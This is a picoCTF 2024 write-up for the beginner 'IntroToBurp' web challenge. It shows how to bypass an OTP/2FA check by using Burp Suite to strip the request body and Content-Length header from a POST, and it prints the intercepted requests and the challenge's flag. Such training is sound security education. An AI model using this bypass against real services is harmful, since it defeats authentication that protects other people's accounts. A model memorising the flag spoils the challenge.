# üß© CTF Challenge Writeup  
**Challenge Name:** IntroToBurp  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF 2024  
**Author:** Nana Ama Atombo-Sackey & Sabine Gisagara  
**Date:** 22-01-26  

---

## üîç 1. Challenge Description

The challenge provides a simple web application and asks the user to:

> *‚ÄúTry here to find the flag‚Äù*

Upon opening the provided link, the user is presented with a **registration flow followed by a 2FA (OTP) authentication page**.  
Any OTP value entered results in an **‚ÄúInvalid OTP‚Äù** message.

A critical hint is provided:

> *‚ÄúTry mangling the request, maybe their server-side code doesn't handle malformed requests very well.‚Äù*

This hint strongly suggests that the vulnerability lies **not in guessing the OTP**, but in **manipulating the structure of the HTTP request itself**.

---

## üß† 2. Initial Thoughts / Approach

Given:
- **Web Exploitation** category  
- **Easy** difficulty  
- Explicit hint mentioning **server-side handling** and **malformed requests**

Key observations:
- OTP validation is performed **server-side**
- Changing OTP values does not affect the result
- A valid **session cookie** is already issued after registration
- Backend server is identified as **Flask / Werkzeug**

This indicates a likely **authentication flow bypass** via **malformed HTTP requests**, rather than brute-forcing or logic manipulation.

---

## üõ†Ô∏è 3. Steps to Solve

### 3.1 Launch the Challenge Instance
Click the **‚Äúhere‚Äù** link to start the instance.  
Register with any credentials and proceed to the **2FA authentication page**.
### 3.2 Set Up Burp Suite
- Launch **Burp Suite (Community Edition)**
- Configure the browser to proxy traffic through Burp (`127.0.0.1:8080`)
- Enable **Proxy ‚Üí Intercept**
### 3.3 Intercept the OTP Submission Request
On the 2FA page:
- Enter any value in the OTP field
- Click **Submit**

Burp intercepts the following request:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:55861
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Cookie: session=...

otp=pswd
```
Submitting this request normally always returns:
```http
HTTP/1.1 200 OK

Invalid OTP
```
### 3.4 Mangle the HTTP Request (Core Exploit)
Following the hint, the request is intentionally malformed.

**Actions performed:**
- **Delete the request body** 
```diff
- otp=pswd
```
- **Delete the Content-Length header:** 
```diff
- Content-Length: 8
```
The final malformed request looks like:
```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:55861
Content-Type: application/x-www-form-urlencoded
Cookie: session=...
```
The request now has no body and no Content-Length header.
### 3.5 Forward the Request
Click **Forward** in Burp.

This malformed request causes the server-side OTP handling logic to fail, while still trusting the valid session cookie.
### 3.6 Access the Dashboard
AAfter forwarding:

- The dashboard page loads successfully
- The server responds with a success message and reveals the flag directly in the page content

---
## üß©  4. Final Flag 
```bash
picoCTF{#OTP_Bypvss_SuCc3$$S_e1eb16ed}
```

---
## üìö 5. Key Learnings
- OTP or 2FA mechanisms can be bypassed if request parsing is flawed
- Malformed HTTP requests can break server-side logic
- A valid session cookie can be dangerous if authorization checks are incomplete
- Error messages that remain unchanged despite input variations signal structural vulnerabilities
- Burp Suite is essential not just for inspection, but for active request manipulation

---
## üöÄ 6. Improvements for Next Time
- Stop changing parameter values when behavior does not change
- Pay close attention to hints mentioning parsing or handling
- Identify backend frameworks early (e.g., Flask/Werkzeug)
- Test malformed requests:
  - Missing body
  - Missing or incorrect Content-Length
  - Method/body mismatches
- Think in terms of request structure, not just request data

---
## üîó 7. References
- OWASP Top 10 ‚Äì Broken Authentication
- OWASP Testing Guide ‚Äì Input Validation
- Flask / Werkzeug Request Parsing Behavior
- Burp Suite Documentation
- picoCTF Web Exploitation Practice Challenges